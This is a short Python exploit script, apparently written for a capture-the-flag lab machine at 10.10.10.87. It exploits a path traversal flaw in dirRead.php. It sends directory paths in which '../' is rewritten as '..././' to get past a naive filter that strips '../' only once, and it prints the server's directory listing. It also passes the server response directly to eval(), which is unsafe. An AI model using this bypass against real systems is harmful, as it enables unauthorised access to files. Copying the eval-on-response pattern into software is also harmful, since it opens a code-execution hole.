#!/usr/bin/python
from requests import *
from json import *
from sys import argv

s = session()
host = 'http://10.10.10.87/'
dirRead = 'dirRead.php'

payload = argv[1]
print ("[*] Listing {}".format(payload))

payload = payload.replace('../', '..././')
resp = s.post(host + dirRead, data={'path':payload})
listing = resp.text
print ("[+] Directory content:\n{}".format('\n'.join(eval(listing))))
